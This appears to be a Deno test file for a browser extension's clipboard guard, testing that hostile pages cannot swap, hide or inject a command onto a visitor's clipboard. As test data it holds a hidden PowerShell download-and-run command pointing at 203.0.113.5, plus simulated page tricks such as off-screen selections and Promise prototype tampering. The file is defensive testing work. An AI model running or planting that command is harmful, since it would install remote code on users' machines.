// Review 2026-11-16 (version 0.3.6) for src/guards/clipboard.js.
//
// WP-02: the checked text must be the copied text. A page copy listener that
//   runs after the guard (document, target or bubble phase) could change the
//   selection or a field's selection range, and the browser then copied the
//   new selection. Selection.toString() also leaves out <img alt> text and the
//   values of <textarea> / <input> elements inside the range, but Chrome's
//   text/plain copy puts them in. Now the guard cancels the browser's own
//   serialisation of a copy and writes the checked text itself (native
//   preventDefault + native setData, captured at load). text/html is left out.
//   A cut that the visitor starts (Ctrl+X) keeps the browser's cut, so the
//   selected text is still removed; it is checked again, with alt text and
//   field values, by a last listener in the bubble phase.
//
// The fakes follow Chrome (checked in headless Chrome for Testing with the
// unpacked extension, scratch checks): listeners on window run in the capture
// phase first, then in the bubble phase; listeners added during a dispatch to
// a later phase run in that dispatch; a cancelled copy with no data leaves the
// clipboard unchanged; a password field fires no copy event; for an email
// field selectionStart is null and Selection.toString() gives the field text.
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import { unwrapMain } from "./fixtures/main-source.mjs";

function assert(c, l) { if (!c) throw new Error(l); }
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing)\"";

let clock = 1000;
const tick = (ms) => { clock += ms; };

// One window. sel = Selection.toString(); copyText = what Chrome's serialiser
// copies when it differs (alt text, field values in the range); field = the
// focused text field (plain properties: the fake has no native getters).
function page(host = "verify-human.example") {
  const cap = {};
  const bub = {};
  // rect: the selection's bounding box (WP-05); the viewport is 1000 x 800.
  const st = { sel: "", copyText: null, field: null, rect: { left: 10, top: 10, right: 300, bottom: 30, width: 290, height: 20 } };
  const notices = [];
  const clipboard = { text: "PREV", cutDone: false };
  class Event {
    constructor(type) { this.type = type; this.isTrusted = false; this.defaultPrevented = false; this.stopped = false; }
    preventDefault() { this.defaultPrevented = true; }
    stopPropagation() { this.stopped = true; }
  }
  class ClipboardEvent extends Event {
    constructor(type, init = {}) { super(type); this._cd = init.clipboardData || null; }
    get clipboardData() { return this._cd; }
  }
  const setDataCalls = [];
  class DataTransfer {
    constructor() { this.data = {}; }
    setData(t, s) { t = String(t); s = String(s); setDataCalls.push([t, s]); this.data[t] = s; }
  }
  class Range { getBoundingClientRect() { return st.rect; } }
  class Selection {
    toString() { return st.sel; }
    get rangeCount() { return st.sel ? 1 : 0; }
    getRangeAt() { return new Range(); }
  }
  class Element { getBoundingClientRect() { return st.rect; } }
  class Document {
    execCommand(cmd) {
      cmd = String(cmd);
      if (cmd !== "copy" && cmd !== "cut") return true;
      r.browserCopy(cmd, true); // script on the stack
      return true;
    }
    get activeElement() { return st.field; }
  }
  const micro = [];
  const drain = () => { while (micro.length) micro.shift()(); };
  const dispatch = (e, fromBrowser) => {
    for (const f of [...(cap[e.type] || [])]) { f(e); if (fromBrowser) drain(); }
    if (!e.stopped) for (const f of [...(bub[e.type] || [])]) { f(e); if (fromBrowser) drain(); }
    return !e.defaultPrevented;
  };
  const window = {
    getSelection: () => new Selection(), Selection, DataTransfer, Event, ClipboardEvent, Document, Range, Element,
    queueMicrotask: (f) => { micro.push(f); },
    addEventListener(t, f, c) { ((c ? cap : bub)[t] ||= []).push(f); },
    removeEventListener(t, f, c) { const l = (c ? cap : bub)[t] || []; const i = l.indexOf(f); if (i >= 0) l.splice(i, 1); },
    dispatchEvent(e) { return dispatch(e, false); },
  };
  // Like Chrome: own accessors on the window object.
  Object.defineProperty(window, "innerWidth", { get: () => 1000, configurable: true });
  Object.defineProperty(window, "innerHeight", { get: () => 800, configurable: true });
  const fieldText = () => (st.field.type === "email" ? st.sel : st.field.value.slice(st.field.selectionStart, st.field.selectionEnd));
  const r = {
    window, notices, clipboard, setDataCalls, st,
    select: (s, copyText = null) => { st.sel = s; st.copyText = copyText; },
    focusField: (value, start, end, type = "text") => { st.field = value === null ? null : { value, selectionStart: start, selectionEnd: end, type }; if (st.field) st.sel = type === "email" ? value : fieldText(); },
    // The browser's own copy/cut. Not cancelled: the browser copies the
    // selection as it is AFTER all listeners. Cancelled: the event's data.
    browserCopy(type = "copy", fromScript = false) {
      const dt = new DataTransfer();
      const ev = new ClipboardEvent(type, { clipboardData: dt });
      ev.isTrusted = true;
      dispatch(ev, !fromScript);
      if (ev.defaultPrevented) {
        if ("text/plain" in dt.data) clipboard.text = dt.data["text/plain"];
      } else {
        // Chrome copies nothing from a password field or an empty selection.
        const text = st.field ? (st.field.type === "password" ? "" : fieldText()) : (st.copyText ?? st.sel);
        if (text) clipboard.text = text;
        if (type === "cut") clipboard.cutDone = true;
      }
      if (!fromScript) drain();
      return ev;
    },
    trusted(type, props = {}) { const ev = Object.assign(new Event(type), props); ev.isTrusted = true; dispatch(ev, true); drain(); return ev; },
    written: [],
    // Script sets the selection: Chrome then fires a trusted selectionchange.
    pageSelect(s, rect) { st.sel = s; st.copyText = null; if (rect) st.rect = rect; r.trusted("selectionchange"); },
    // The visitor drags over visible text: pointer events, then selectionchange.
    userDrag(s) {
      r.trusted("pointerdown", { buttons: 1 });
      tick(120);
      r.trusted("pointermove", { buttons: 1 });
      st.sel = s; st.copyText = null;
      r.trusted("selectionchange");
      tick(80);
      r.trusted("pointerup", { buttons: 0 });
    },
  };
  r.document = new Document();
  const navClipboard = { writeText(x) { r.written.push(x); return Promise.resolve(); } };
  loadClip().install({ window, document: r.document, navigator: { clipboard: navClipboard }, location: { hostname: host }, now: () => clock, notify: (id) => notices.push(id), flagOn: () => true });
  r.navClipboard = navClipboard;
  return r;
}
const hasCmd = (s) => typeof s === "string" && s.includes("powershell");

// ---- WP-02 ----

Deno.test("WP-02 (a): a document copy listener that selects a hidden command after execCommand('copy') does not get it copied", () => {
  const p = page();
  p.select("Hello world, this is plain text.");
  p.window.addEventListener("copy", () => { p.select(CMD); }); // runs after the guard
  p.document.execCommand("copy");
  assert(!hasCmd(p.clipboard.text), "command copied: " + p.clipboard.text);
  assert(p.clipboard.text === "Hello world, this is plain text.", "checked text not copied: " + p.clipboard.text);
});

Deno.test("WP-02 (b): the same swap after the visitor's Ctrl+C on harmless text does not get the command copied", () => {
  const p = page();
  p.select("Hello world, this is plain text.");
  p.window.addEventListener("copy", () => { p.select(CMD); });
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(!hasCmd(p.clipboard.text), "command copied: " + p.clipboard.text);
  assert(p.clipboard.text === "Hello world, this is plain text.", "checked text not copied: " + p.clipboard.text);
});

Deno.test("WP-02 (c): a listener that moves a textarea's selection range to a command line does not get it copied", () => {
  const p = page();
  const value = "hello there friend\n" + CMD;
  p.focusField(value, 0, 5);
  p.window.addEventListener("copy", () => { p.st.field.selectionStart = 19; p.st.field.selectionEnd = value.length; });
  p.document.execCommand("copy");
  assert(!hasCmd(p.clipboard.text), "command copied: " + p.clipboard.text);
  assert(p.clipboard.text === "hello", "checked field slice not copied: " + p.clipboard.text);
});

for (const [name, copied] of [["<img alt=CMD>", `x ${CMD} y`], ["<textarea>CMD</textarea>", `x \n${CMD}\n y`], ["<input value=CMD>", `x \n${CMD}\n y`]]) {
  Deno.test(`WP-02 (d-f): a range over ${name} (left out by toString) does not put the command on the clipboard`, () => {
    for (const how of ["execCommand", "Ctrl+C"]) {
      const p = page();
      p.select("x  y", copied); // toString leaves the command out; Chrome's copy has it
      if (how === "Ctrl+C") { p.trusted("keydown", { key: "c", ctrlKey: true }); p.browserCopy("copy"); } else p.document.execCommand("copy");
      assert(!hasCmd(p.clipboard.text), `${how}: command copied: ` + p.clipboard.text);
    }
  });
}

Deno.test("WP-02 (g): a normal Ctrl+C of plain text copies that text; the guard cancels the event and writes the checked text with the native setData", () => {
  const p = page();
  p.select("Hello bold world.\n\nSecond para.");
  p.trusted("keydown", { key: "c", ctrlKey: true });
  const ev = p.browserCopy("copy");
  assert(p.clipboard.text === "Hello bold world.\n\nSecond para.", "normal copy broke: " + p.clipboard.text);
  assert(ev.defaultPrevented, "the guard did not cancel the browser's serialisation");
  assert(p.setDataCalls.length === 1 && p.setDataCalls[0][0] === "text/plain" && p.setDataCalls[0][1] === "Hello bold world.\n\nSecond para.", "native setData not called with the checked text: " + JSON.stringify(p.setDataCalls));
  assert(p.notices.length === 0, "notice on a normal copy");
});

Deno.test("WP-02: the visitor's own Ctrl+C of a selected command still copies it (README: select the text and press Ctrl+C)", () => {
  const p = page();
  p.select("run: " + CMD);
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(p.clipboard.text === "run: " + CMD, "own copy of a command broke: " + p.clipboard.text);
});

Deno.test("WP-02: a page copy handler that writes its own data still works; an empty selection leaves the clipboard alone", () => {
  const p = page();
  p.select("quoted text");
  p.window.addEventListener("copy", (e) => { e.clipboardData.setData("text/plain", "quoted text\n\nRead more at example.org"); e.preventDefault(); });
  p.document.execCommand("copy");
  assert(p.clipboard.text === "quoted text\n\nRead more at example.org", "page handler data lost: " + p.clipboard.text);
  const q = page();
  q.select("");
  q.trusted("keydown", { key: "c", ctrlKey: true });
  q.browserCopy("copy");
  assert(q.clipboard.text === "PREV", "empty copy changed the clipboard: " + q.clipboard.text);
  // An email field: no selectionStart, toString gives the text (Chrome).
  const m = page();
  m.focusField("a@b.example", null, null, "email");
  m.trusted("keydown", { key: "c", ctrlKey: true });
  m.browserCopy("copy");
  assert(m.clipboard.text === "a@b.example", "email field copy broke: " + m.clipboard.text);
});

Deno.test("WP-02: the visitor's Ctrl+X keeps the browser's cut (text removed), and a bubble listener's swap to a command is caught", () => {
  const p = page();
  p.select("edit me");
  p.trusted("keydown", { key: "x", ctrlKey: true });
  const ev = p.browserCopy("cut");
  assert(!ev.defaultPrevented && p.clipboard.cutDone && p.clipboard.text === "edit me", "normal cut broke");
  const q = page();
  q.select("edit me");
  q.window.addEventListener("cut", () => { q.select(CMD); }); // page bubble listener, after the guard's capture check
  q.trusted("keydown", { key: "x", ctrlKey: true });
  q.browserCopy("cut");
  assert(!hasCmd(q.clipboard.text), "cut of a swapped-in command: " + q.clipboard.text);
  // A page-initiated cut (execCommand) is copied like a copy: the checked text.
  const c = page();
  c.select("edit me");
  c.window.addEventListener("cut", () => { c.select(CMD); });
  c.document.execCommand("cut");
  assert(!hasCmd(c.clipboard.text), "execCommand cut of a swapped-in command: " + c.clipboard.text);
});

Deno.test("WP-02: a password field never has its value written by the guard", () => {
  const p = page();
  p.focusField("secretpw1", 0, 9, "password");
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(p.clipboard.text !== "secretpw1", "password written");
});

// ---- WP-03: clipboard.write() fails closed ----

// navigator.clipboard.write with fake ClipboardItem / Blob. getType returns a
// real (Deno/V8) promise, so `await` reads promise.constructor as in Chrome.
function writePage(host = "verify-human.example", flag = true) {
  const written = [];
  class Blob { constructor(parts) { this.parts = parts; } text() { return Promise.resolve(this.parts.join("")); } }
  class ClipboardItem {
    constructor(map, opts = {}) { this.map = map; this.throwOnGetType = !!opts.throwOnGetType; }
    get types() { return Object.keys(this.map); }
    getType(type) { if (this.throwOnGetType) throw new Error("getType failed"); return Promise.resolve(this.map[type]); }
  }
  class Clipboard { write(items) { for (const it of items) written.push(it.types.join(",") + ":" + (it.map["text/plain"] ? it.map["text/plain"].parts.join("") : "")); return Promise.resolve(); } }
  const clipboard = new Clipboard();
  class Document {}
  const document = new Document();
  document.addEventListener = () => {};
  const window = { Blob, ClipboardItem, Document };
  loadClip().install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => clock, notify: () => {}, flagOn: () => { if (flag === "throw") throw new Error("x"); return flag; } });
  return { clipboard, written, Blob, ClipboardItem };
}
const outcome = (pr) => pr.then(() => "resolved", (e) => (e && e.name) || "rejected");

Deno.test("WP-03: a throw while the guard reads a text item (getType) rejects the write; the native write never runs", async () => {
  const p = writePage();
  const r = await outcome(p.clipboard.write([new p.ClipboardItem({ "text/plain": new p.Blob([CMD]) }, { throwOnGetType: true })]));
  assert(r === "NotAllowedError" && p.written.length === 0, "fail open: " + JSON.stringify({ r, w: p.written }));
});

Deno.test("WP-03: a throwing Promise.prototype.constructor getter around write() does not let the command through", async () => {
  const p = writePage();
  const desc = Object.getOwnPropertyDescriptor(Promise.prototype, "constructor");
  let pr;
  try {
    Object.defineProperty(Promise.prototype, "constructor", { get() { throw new Error("x"); }, configurable: true });
    pr = p.clipboard.write([new p.ClipboardItem({ "text/plain": new p.Blob([CMD]) })]);
  } finally {
    Object.defineProperty(Promise.prototype, "constructor", desc);
  }
  const r = await outcome(pr);
  assert(!p.written.some((w) => hasCmd(w)), "command written: " + JSON.stringify({ r, w: p.written }));
});

Deno.test("WP-03: a Promise.prototype.constructor getter plus a page `then` cannot feed the check a harmless Blob (t2 case A2)", async () => {
  const p = writePage();
  const desc = Object.getOwnPropertyDescriptor(Promise.prototype, "constructor");
  const realThen = Promise.prototype.then;
  const clean = new p.Blob(["hello"]);
  let pr;
  try {
    Object.defineProperty(Promise.prototype, "constructor", { get() { return Object; }, configurable: true });
    Promise.prototype.then = function (ok, bad) {
      return realThen.call(this, (v) => (ok ? ok((v instanceof p.Blob && v.parts.join("").length > 20) ? clean : (typeof v === "string" && v.includes("powershell") ? "hello" : v)) : v), bad);
    };
    pr = p.clipboard.write([new p.ClipboardItem({ "text/plain": new p.Blob([CMD]) })]);
    realThen.call(pr, null, () => {}); // handled now; the outcome is read below
    await new Promise((r) => setTimeout(r, 20));
  } finally {
    Promise.prototype.then = realThen;
    Object.defineProperty(Promise.prototype, "constructor", desc);
  }
  const r = await outcome(pr);
  assert(!p.written.some((w) => hasCmd(w)), "command written: " + JSON.stringify({ r, w: p.written }));
});

Deno.test("WP-03 controls: image-only and ordinary text writes pass; the switch off, a docs host and a throwing switch still write", async () => {
  const p = writePage();
  assert(await outcome(p.clipboard.write([new p.ClipboardItem({ "image/png": new p.Blob(["png"]) })])) === "resolved", "image-only write");
  assert(await outcome(p.clipboard.write([new p.ClipboardItem({ "text/plain": new p.Blob(["hello"]) })])) === "resolved", "text write");
  assert(p.written.length === 2, "writes: " + JSON.stringify(p.written));
  // An image-only item is never read, so a throwing getType does not matter.
  assert(await outcome(p.clipboard.write([new p.ClipboardItem({ "image/png": new p.Blob(["png"]) }, { throwOnGetType: true })])) === "resolved", "image-only write with a throwing getType");
  for (const [host, flag] of [["verify-human.example", false], ["docs.github.com", true], ["verify-human.example", "throw"]]) {
    const q = writePage(host, flag);
    const r = await outcome(q.clipboard.write([new q.ClipboardItem({ "text/plain": new q.Blob([CMD]) }, { throwOnGetType: true })]));
    assert(r === "resolved" && q.written.length === 1, `guard not active (${host}, ${flag}): ` + r);
  }
});

// ---- WP-05: a page-made selection is not the visitor's copy ----

const OFFSCREEN = { left: -9999, top: 100, right: -9600, bottom: 120, width: 399, height: 20 };
const VISIBLE = { left: 10, top: 10, right: 300, bottom: 30, width: 290, height: 20 };
const rejectedWrite = (p, text) => p.navClipboard.writeText(text).then(() => false, () => true);

Deno.test("WP-05: the page selects an off-screen command, the visitor presses Ctrl+C: no command, and no 1.5 s page-write window", async () => {
  const p = page();
  p.pageSelect(CMD, OFFSCREEN); // at load, no visitor input
  tick(3000);
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(!hasCmd(p.clipboard.text), "command copied: " + p.clipboard.text);
  tick(200);
  assert(await rejectedWrite(p, CMD), "page writeText of the command inside the key window was allowed");
  assert(p.notices.length > 0, "no notice");
});

Deno.test("WP-05: a visible command that the page selected (no visitor input) does not count as the visitor's copy", async () => {
  const p = page();
  p.pageSelect(CMD, VISIBLE);
  tick(3000);
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(!hasCmd(p.clipboard.text), "command copied: " + p.clipboard.text);
  assert(await rejectedWrite(p, CMD), "page writeText allowed");
});

Deno.test("WP-05: a page click handler that selects an off-screen command is caught by the visibility check", () => {
  const p = page();
  p.trusted("pointerdown", { buttons: 1 });
  p.trusted("pointerup", { buttons: 0 });
  p.pageSelect(CMD, OFFSCREEN); // inside the click handler: within 500 ms of trusted input
  tick(1000);
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(!hasCmd(p.clipboard.text), "command copied: " + p.clipboard.text);
});

Deno.test("WP-05 controls: the visitor drag-selects or Ctrl+A-selects a visible command and presses Ctrl+C: it is copied (README)", async () => {
  const p = page();
  p.st.rect = VISIBLE;
  p.userDrag("run: " + CMD);
  tick(2000); // the visitor reads, then copies
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(p.clipboard.text === "run: " + CMD, "drag-select copy broke: " + p.clipboard.text);
  // The page's copy button right after the visitor's own Ctrl+C still works (1.5 s window).
  tick(300);
  assert(!(await rejectedWrite(p, CMD)), "page write of the visitor's selected text refused");
  const k = page();
  k.st.rect = VISIBLE;
  k.trusted("keydown", { key: "a", ctrlKey: true });
  k.st.sel = CMD;
  k.trusted("selectionchange");
  tick(1500);
  k.trusted("keydown", { key: "c", ctrlKey: true });
  k.browserCopy("copy");
  assert(k.clipboard.text === CMD, "Ctrl+A, Ctrl+C copy broke: " + k.clipboard.text);
});

Deno.test("WP-05: the visitor's selection, later changed by a page timer to a command, does not count", () => {
  const p = page();
  p.st.rect = VISIBLE;
  p.userDrag("Hello world");
  tick(2000);
  p.pageSelect(CMD, VISIBLE); // timer, no visitor input in the last 500 ms
  tick(100);
  p.trusted("keydown", { key: "c", ctrlKey: true });
  p.browserCopy("copy");
  assert(!hasCmd(p.clipboard.text), "command copied: " + p.clipboard.text);
});
